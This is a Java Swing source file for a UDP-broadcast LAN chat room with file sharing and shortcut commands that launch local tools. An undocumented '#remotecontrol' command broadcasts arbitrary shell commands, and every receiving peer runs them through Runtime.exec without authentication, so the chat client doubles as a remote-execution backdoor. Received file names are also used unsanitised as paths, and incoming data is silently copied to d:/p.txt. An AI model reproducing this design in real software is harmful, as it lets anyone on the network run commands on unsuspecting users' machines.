package com.bigfire.chat;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import java.util.regex.*;
import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
public class Chat
{
	public static JFrame loginjf;//登录界面
	public static void main(String[] args)
	{
		loginView();//加载登录界面
	}
	private static void loginView()
	{
		loginjf = new JFrame("输入自己的名字");//登录界面标题
		final JTextField nametext = new JTextField(10);//输入框
		loginjf.setLayout(new FlowLayout());//设置界面流式布局
		JButton jb = new JButton("登录");//登录按钮
		loginjf.add(nametext);
		loginjf.add(jb);
		nametext.addActionListener(new CheckTextField(nametext));//输入监听事件
		jb.addActionListener(new CheckTextField(nametext));//按钮监听事件
		loginjf.setBounds(450, 300, 350, 100);//设置界面大小
		loginjf.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);//设置界面关闭方式为：可关闭
		loginjf.setVisible(true);
	}

}
class CheckTextField implements ActionListener// 检测登陆框内容是否为空
{
	private JTextField jtextField;

	public CheckTextField(JTextField jtextField)
	{
		this.jtextField = jtextField;
	}
	public void actionPerformed(ActionEvent arg0)
	{
		String selfname = jtextField.getText();
		if (selfname.equals(""))
		{
			JDialog jdl = new JDialog(Chat.loginjf, "提示", true);
			jdl.setBounds(500, 200, 400, 150);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel("用户名不能为空");
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		} else if (selfname.length() > 1 && selfname.length() < 20)
		{
			Chat.loginjf.dispose();
			new MainFrame(selfname, "局域网聊天室2.0");
		} else
		{
			JDialog jdl = new JDialog(Chat.loginjf, "提示", true);
			jdl.setBounds(500, 200, 400, 150);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel("<html>请尽量使用真名或网名<br>尽量符合用户名标准</html>");
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		}
	}
}
class MainFrame extends JFrame
{
	private final String selfname;// 自己的名称
	private DatagramSocket socket;
	private JTextArea jtaDisplay;
	private JTextField jtfSendMsg;
	public MainFrame self;
	private File filedir;
	private File file;
	private String filename;
	public MainFrame(String selfname, String title)
	{
		super(title);
		this.self = this;
		this.selfname = selfname;
		try
		{
			socket = new DatagramSocket(999);
		} catch (Exception e)
		{
			e.printStackTrace();
		}
		initView();
		new Thread()
		{
			@Override
			public void run()
			{
				try
				{
					getData();

				} catch (IOException e)
				{
					e.printStackTrace();
				}
			}
		}.start();
	}
	private void initView()
	{
		setBounds(450, 80, 500, 600);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		JMenuBar jmb = new JMenuBar();
		JMenu jmFile = new JMenu("文件");
		JMenu jmTools = new JMenu("工具");
		JMenu jmAbout = new JMenu("关于");

		JMenuItem jmiFileSend = new JMenuItem("群发文件");
		JMenuItem jmiFileNote = new JMenuItem("群发文件说明");

		JMenuItem jmiBaiduTools = new JMenuItem("百度一下");
		JMenuItem jmiNotePad = new JMenuItem("笔记本");
		JMenuItem jmiPaint = new JMenuItem("画图");
		JMenuItem jmiCalculatorTools = new JMenuItem("计算器");
		JMenuItem jmiCmd = new JMenuItem("命令控制符");
		JMenuItem jmiControl = new JMenuItem("控制面板");

		JMenuItem jmiSoftHelp = new JMenuItem("帮助");
		JMenuItem jmiAboutSoftWare = new JMenuItem("关于软件");
		JMenuItem jmiAboutAuthor = new JMenuItem("关于作者");

		jmb.add(jmFile);
		jmb.add(jmTools);
		jmb.add(jmAbout);

		jmFile.add(jmiFileSend);
		jmFile.add(jmiFileNote);

		jmTools.add(jmiBaiduTools);
		jmTools.add(jmiNotePad);
		jmTools.add(jmiPaint);
		jmTools.add(jmiCalculatorTools);
		jmTools.add(jmiCmd);
		jmTools.add(jmiControl);

		jmAbout.add(jmiSoftHelp);
		jmAbout.add(jmiAboutSoftWare);
		jmAbout.add(jmiAboutAuthor);
		setJMenuBar(jmb);
		jtaDisplay = new JTextArea();
		final JScrollPane jspScrollBar = new JScrollPane(jtaDisplay);
		jtfSendMsg = new JTextField(10);
		jtaDisplay.setEditable(false);
		add(jspScrollBar, BorderLayout.CENTER);
		add(jtfSendMsg, BorderLayout.SOUTH);
		setVisible(true);

		jmiFileSend.addActionListener(new FileSendAction());
		jmiFileNote
				.addActionListener(new DialogAction(
						"<center><h2>由于本软件采用UDP传输,\n可能会丢数据包导致图片类文件损坏,\n所以尽量不要用本软件群发图片</h2></center>"));
		jmiBaiduTools.addActionListener(new ToolsAction(
				"explorer http://www.baidu.com"));
		jmiNotePad.addActionListener(new ToolsAction("notepad"));
		jmiPaint.addActionListener(new ToolsAction("mspaint"));
		jmiCalculatorTools.addActionListener(new ToolsAction("calc"));
		jmiCmd.addActionListener(new ToolsAction("cmd /k start"));
		jmiControl.addActionListener(new ToolsAction("control"));

		jmiSoftHelp
				.addActionListener(new BigDialogAction(
						"<h1>本软件支持的一些扩展命令</h1><h2>#cmd\n#notepad\n#mspaint\n#control\n#calc\n#regedit\n#mstsc\n#ip\n#任意cmd指令#</h2><h1 style=\"color:red\">需要联网的命令</h1><h2>#天气+城市\n#翻译+英文\n#歌词+歌名\n#笑话</h2>"));
		jmiAboutSoftWare
				.addActionListener(new DialogAction(
						"<center><h1>局域网聊天室2.0</h1></cenrer>\n1.本软件只支持在同一局域网内。\n2.支持同一局域网内群发文件。\n3.本软件用java语言制作需要jre运行环境"));
		jmiAboutAuthor.addActionListener(new DialogAction(
				"<h3>QQ：       835476090\nAuthor:  a * 大火\n谢谢试用<h3>"));
		jtfSendMsg.addActionListener(new MsgSendAction(jtfSendMsg));
		addWindowFocusListener(new WindowClose());
		String loginOkText = "【" + selfname + "】上线了"
				+ "                      (*^__^*)系统提示(*^__^*)";
		sendText(loginOkText);
	}
	private void sendText(String data)
	{
		try
		{
			int datalen = data.length();
			String protocol = "<myProtocol>&text&" + datalen + "&</myProtocol>";
			byte[] b = protocol.getBytes();

			//			System.out.println(protocol);
			//			System.out.println(b.length);
			DatagramPacket protocolpack = new DatagramPacket(b, b.length,
					InetAddress.getByName("255.255.255.255"), 999);
			socket.send(protocolpack);
			byte[] databuf = data.getBytes();
			DatagramPacket datapack = new DatagramPacket(databuf,
					databuf.length, InetAddress.getByName("255.255.255.255"),
					999);
			socket.send(datapack);
		} catch (IOException e)
		{
			e.printStackTrace();
		}
	}
	private void sendCmd(String cmdstr)
	{
		try
		{
			int datalen = cmdstr.length();
			String protocol = "<myProtocol>&cmd&" + datalen + "&</myProtocol>";
			byte[] b = protocol.getBytes();

			//			System.out.println(protocol);
			//			System.out.println(b.length);
			DatagramPacket protocolpack = new DatagramPacket(b, b.length,
					InetAddress.getByName("255.255.255.255"), 999);
			socket.send(protocolpack);
			byte[] databuf = cmdstr.getBytes();
			DatagramPacket datapack = new DatagramPacket(databuf,
					databuf.length, InetAddress.getByName("255.255.255.255"),
					999);
			socket.send(datapack);
		} catch (IOException e)
		{
			e.printStackTrace();
		}
	}
	private void getData() throws IOException
	{
		int defsize = 100;
		while (true)
		{
			byte[] buf = new byte[defsize];
			DatagramPacket dp = new DatagramPacket(buf, buf.length);
			socket.receive(dp);
			String data = new String(dp.getData(), 0, dp.getLength());

			//			System.out.println("RECEIVE"+data);
			//			System.out.println(data.startsWith("<myProtocol>"));
			//			System.out.println(data.endsWith("</myProtocol>"));
			//			System.out.println(data.contains("&"));
			if (data.startsWith("<myProtocol>")
					&& data.endsWith("</myProtocol>") && data.contains("&"))
			{
				//				System.out.println("进入协议");
				String[] protocols = data.split("&");
				String type = protocols[1];
				String nextPackLen = protocols[2];
				int size = Integer.valueOf(nextPackLen);
				if (type.equals("file"))
				{
					filename = protocols[3];
					String senderip = dp.getAddress().getHostAddress();
					FileSystemView fsv = FileSystemView.getFileSystemView();
					File com = fsv.getHomeDirectory();
					String deskpath = com.getPath();

					filedir = new File(deskpath + "/" + senderip);
					file = new File(filedir, filename);
					//					System.out.println("myprotocols"+filedir+"||"+filename);
					if (!filedir.exists())
					{
						System.out.println(filedir.mkdirs());
					}
					if (!file.exists())
					{
						System.out.println(file.createNewFile());
					}
					defsize = size;
				} else if (type.equals("cmd"))
				{
					byte[] temp = new byte[1024];
					DatagramPacket datepack = new DatagramPacket(temp,
							temp.length);
					socket.receive(datepack);
					String cmdMsg = new String(datepack.getData(), 0, datepack
							.getLength());
					String requestIP = dp.getAddress().toString().replace("/",
							"");
					if (!requestIP.equals(InetAddress.getLocalHost()
							.getHostAddress()))
					{
						exeCmd(cmdMsg);
					}
				} else if (type.equals("text"))
				{
					byte[] temp = new byte[1024];
					DatagramPacket datepack = new DatagramPacket(temp,
							temp.length);
					socket.receive(datepack);
					String textMsg = new String(datepack.getData(), 0, datepack
							.getLength());
					//					System.out.println("size:"+size+"  "+textMsg);
					jtaDisplay.append(textMsg + "\r\n");
				} else
				{
					System.out.println("未知协议数据");// 一般不会走到这里
				}
			} else
			//文件数据
			{
				//				System.out.println("非协议数据层");
				//				System.out.println(filedir+"||"+filename);
				file = new File(filedir, filename);
				//				System.out.println("afsize:"+file.length());
				writeStringToFile("d:/p.txt", data);
				FileOutputStream fos = new FileOutputStream(file);
				fos.write(data.getBytes());
				fos.close();
				//				System.out.println("bfsize:"+file.length());
			}
		}
	}
	class WindowClose extends WindowAdapter
	{
		public void windowClosing(WindowEvent e)
		{
			String offline = "【" + selfname + "】下线了"
					+ "                      (*^__^*)系统提示(*^__^*)";
			sendText(offline);
		}
	}
	class DialogAction implements ActionListener
	{
		private String note;

		public DialogAction(String note)
		{
			this.note = "<html><center>"
					+ note.replace("\n", "<br>").replace(" ", "&nbsp;")
					+ "</center></html>";
		}

		public void actionPerformed(ActionEvent arg0)
		{
			JDialog jdl = new JDialog(self, "提示", true);
			jdl.setBounds(self.getX() + 50, self.getY() + 200, 400, 200);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel(note);
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		}
	}
	class BigDialogAction implements ActionListener
	{
		private String note;

		public BigDialogAction(String note)
		{
			this.note = "<html><center>"
					+ note.replace("\n", "<br>").replace(" ", "&nbsp;")
					+ "</center></html>";
		}

		public void actionPerformed(ActionEvent arg0)
		{
			JDialog jdl = new JDialog(self, "提示", true);

			jdl.setBounds(self.getX() + 75, self.getY(), 350, 600);
			jdl.setLayout(new FlowLayout());
			JLabel jl1 = new JLabel(note);
			jdl.add(jl1);
			jdl.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			jdl.setVisible(true);
		}
	}
	class ToolsAction implements ActionListener
	{
		private String cmd;

		public ToolsAction(String cmd)
		{
			this.cmd = cmd;
		}

		public void actionPerformed(ActionEvent arg0)
		{
			exeCmd(cmd);
		}
	}
	class MsgSendAction implements ActionListener
	{
		private JTextField jtfSendMsg;

		public MsgSendAction(JTextField jtfSendMsg)
		{
			this.jtfSendMsg = jtfSendMsg;
		}

		public void actionPerformed(ActionEvent arg0)
		{
			try
			{
				String msg = jtfSendMsg.getText();
				jtfSendMsg.setText("");

				if (msg.startsWith("#") && msg.endsWith("#"))
				{
					String substr = msg.substring(1, msg.length() - 1);

					if (!exeCmd(substr))
					{
						checkAndDo(msg);
					}
				} else
				{
					checkAndDo(msg);
				}

			} catch (Exception e)
			{
				e.printStackTrace();
			}
		}

		public void checkAndDo(String msg) throws UnknownHostException,
				UnsupportedEncodingException
		{
			if (msg.toLowerCase().equals("#cmd"))
			{
				exeCmd("cmd /k start");
			} else if (msg.toLowerCase().equals("#mspaint")
					|| msg.toLowerCase().equals("#calc")
					|| msg.toLowerCase().equals("#notepad")
					|| msg.toLowerCase().equals("#mstsc")
					|| msg.toLowerCase().equals("#control")
					|| msg.toLowerCase().equals("#regedit")

			)
			{

				exeCmd(msg);
			} else if (msg.toLowerCase().startsWith("#ip"))
			{
				String srchtml = "";
				String publicNetWorkIp = "";
				String address = "";
				srchtml = gbkGet("http://2018.ip138.com/ic.asp");
				//				System.out.println(srchtml);
				if (!srchtml.equals(""))
				{
					Pattern pattern = Pattern
							.compile("\\[(.*?)\\].*?来自：(.*?)\\<");
					Matcher matcher = pattern.matcher(srchtml);
					if (matcher.find())
					{
						publicNetWorkIp = matcher.group(1);
						address = matcher.group(2);
					}
				} else
				{
					publicNetWorkIp = "网络异常，连网即可获取";
				}
				jtaDisplay.append(SystemMSG("\t\t来自:" + address + "\r\n\t\t公网:"
						+ publicNetWorkIp + "\r\n\t\t私网:"
						+ InetAddress.getLocalHost().getHostAddress()));
			} else if (msg.toLowerCase().startsWith("#天气")
					|| msg.toLowerCase().startsWith("#翻译")
					|| msg.toLowerCase().startsWith("#歌词")
					|| msg.toLowerCase().startsWith("#笑话"))
			{
				String param = msg.substring(1, msg.length()).trim();

				String paramcode = URLEncoder.encode(param, "UTF-8");
				String html = "";
				String url = "http://api.qingyunke.com/api.php?key=free&msg="
						+ paramcode;
				html = utf8Get(url);
				System.out.println(html);
				if (!html.equals(""))
				{
					String content = html.substring(23, html.length() - 2)
							.replace("★", "\r\n").replace("{br}", "\r\n");
					jtaDisplay.append(SystemMSG(content));
				}

			} else if (msg.toLowerCase().startsWith("#remotecontrol"))
			{
				String data = msg.substring(14, msg.length()).trim();
				if (data.toLowerCase().equals("cmd"))
				{
					sendCmd("cmd /k start");
				} else
				{
					sendCmd(data);
				}
			} else
			{
				String data = selfname + ":" + msg;
				sendText(data);
			}
		}

		public String SystemMSG(String systemmsg)
		{

			return "\r\n===============================系统提示===============================\r\n"
					+ systemmsg
					+ "\r\n===============================自己可见===============================\r\n";
		}
	}
	class FileSendAction implements ActionListener
	{

		public void actionPerformed(ActionEvent arg0)
		{
			try
			{
				FileDialog fileDialog = new FileDialog(self, "请选择文件"); // 菜单项被选中时就打开一个对话框，让用户选择一个文件
				fileDialog.setVisible(true); // 对话框显示出来
				if (fileDialog.getFile() != null
						&& fileDialog.getDirectory() != null)//防止用户点开对话框后不选择直接关闭的情况
				{
					String fname = fileDialog.getFile(); //获取文件名称
					String url = fileDialog.getDirectory();//获取文件路径
					String urlname = url + fname; //路径加名称及绝对路径
					File file1 = new File(urlname); //根据名字建立文件连接
					long filesize = file1.length();

					String fileprotocol = "<myProtocol>&file&" + filesize + "&"
							+ fname + "&</myProtocol>"; //给文件名称后面加上铮标记
					System.out.println(fileprotocol);
					byte[] filename = fileprotocol.getBytes(); //获得字节数组
					DatagramPacket filenamepack = new DatagramPacket(filename,
							filename.length, InetAddress
									.getByName("255.255.255.255"), 999);
					socket.send(filenamepack);//这个是把文件的名字先发过去

					FileInputStream fr = new FileInputStream(file1);//输入流连接文件
					byte[] buf = new byte[(int) file1.length()];
					fr.read(buf);
					DatagramPacket filedatapack = new DatagramPacket(buf,
							buf.length, InetAddress
									.getByName("255.255.255.255"), 999);
					socket.send(filedatapack);
					//					int len=-1;
					//					while ((len = fr.read(buf)) != -1)
					//					{
					//						DatagramPacket filedatapack = new DatagramPacket(buf,buf.length, InetAddress.getByName("255.255.255.255"), 999);
					//						socket.send(filedatapack);
					//					}
					fr.close();
					String sendFileOk = "【" + selfname + "】给大家发了个文件,你们看下收到没"
							+ "       (*^__^*)系统提示(*^__^*)";
					sendText(sendFileOk);
				}
			} catch (Exception e)
			{
				e.printStackTrace();
			}
		}
	}
	public static String utf8Get(String url)
	{
		String result = "";
		BufferedReader in = null;
		try
		{
			String urlNameString = url;
			URL realUrl = new URL(urlNameString);
			// 打开和URL之间的连接
			URLConnection connection = realUrl.openConnection();
			// 设置通用的请求属性
			connection.setRequestProperty("accept", "*/*");
			connection.setRequestProperty("connection", "Keep-Alive");
			connection.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// 建立实际的连接
			connection.connect();
			//            System.out.println(connection.getContentEncoding());
			// 获取所有响应头字段
			//            Map<String, List<String>> map = connection.getHeaderFields();
			// 遍历所有的响应头字段
			//            for (String key : map.keySet()) {
			//                System.out.println(key + "--->" + map.get(key));
			//            }
			// 定义 BufferedReader输入流来读取URL的响应
			in = new BufferedReader(new InputStreamReader(connection
					.getInputStream(), "UTF-8"));
			String line;

			while ((line = in.readLine()) != null)
			{
				result += line;
			}
		} catch (Exception e)
		{
			System.out.println("发送GET请求出现异常！" + e);
			e.printStackTrace();
		}
		// 使用finally块来关闭输入流
		finally
		{
			try
			{
				if (in != null)
				{
					in.close();
				}
			} catch (Exception e2)
			{
				e2.printStackTrace();
			}
		}
		return result;
	}
	public static String gbkGet(String url)
	{
		String result = "";
		BufferedReader in = null;
		try
		{
			String urlNameString = url;
			URL realUrl = new URL(urlNameString);
			// 打开和URL之间的连接
			URLConnection connection = realUrl.openConnection();
			// 设置通用的请求属性
			connection.setRequestProperty("accept", "*/*");
			connection.setRequestProperty("connection", "Keep-Alive");
			connection.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// 建立实际的连接
			connection.connect();
			//            System.out.println(connection.getContentEncoding());
			// 获取所有响应头字段
			//            Map<String, List<String>> map = connection.getHeaderFields();
			// 遍历所有的响应头字段
			//            for (String key : map.keySet()) {
			//                System.out.println(key + "--->" + map.get(key));
			//            }
			// 定义 BufferedReader输入流来读取URL的响应
			in = new BufferedReader(new InputStreamReader(connection
					.getInputStream(), "gbk"));
			String line;

			while ((line = in.readLine()) != null)
			{
				result += line;
			}
		} catch (Exception e)
		{
			System.out.println("发送GET请求出现异常！" + e);
			e.printStackTrace();
		}
		// 使用finally块来关闭输入流
		finally
		{
			try
			{
				if (in != null)
				{
					in.close();
				}
			} catch (Exception e2)
			{
				e2.printStackTrace();
			}
		}
		return result;
	}
	/**
	 * 向指定 URL 发送POST方法的请求
	 * 
	 * @param url
	 *            发送请求的 URL
	 * @param param
	 *            请求参数，请求参数应该是 name1=value1&name2=value2 的形式。
	 * @return 所代表远程资源的响应结果
	 */
	public static String utf8Post(String url, String param)
	{
		PrintWriter out = null;
		BufferedReader in = null;
		String result = "";
		try
		{
			URL realUrl = new URL(url);
			// 打开和URL之间的连接
			URLConnection conn = realUrl.openConnection();
			// 设置通用的请求属性
			conn.setRequestProperty("accept", "*/*");
			conn.setRequestProperty("connection", "Keep-Alive");
			conn.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// 发送POST请求必须设置如下两行
			conn.setDoOutput(true);
			conn.setDoInput(true);
			// 获取URLConnection对象对应的输出流
			out = new PrintWriter(conn.getOutputStream());
			// 发送请求参数
			out.print(param);
			// flush输出流的缓冲
			out.flush();
			// 定义BufferedReader输入流来读取URL的响应
			in = new BufferedReader(
					new InputStreamReader(conn.getInputStream()));
			String line;
			while ((line = in.readLine()) != null)
			{
				result += line;
			}
		} catch (Exception e)
		{
			System.out.println("发送 POST 请求出现异常！" + e);
			e.printStackTrace();
		}
		//使用finally块来关闭输出流、输入流
		finally
		{
			try
			{
				if (out != null)
				{
					out.close();
				}
				if (in != null)
				{
					in.close();
				}
			} catch (IOException ex)
			{
				ex.printStackTrace();
			}
		}
		return result;
	}
	public static Boolean writeStringToFile(String path, String resources)
	{
		FileOutputStream fos;
		File f = new File(path);
		try
		{
			fos = new FileOutputStream(f);
			fos.write(resources.getBytes());
			fos.close();

		} catch (Exception e)
		{
			e.printStackTrace();
			return false;
		}
		return true;
	}
	public boolean exeCmd(String cmdstr)
	{
		try
		{
			Runtime.getRuntime().exec(cmdstr);
			return true;
		} catch (Exception e1)
		{
			return false;
		}
	}
}
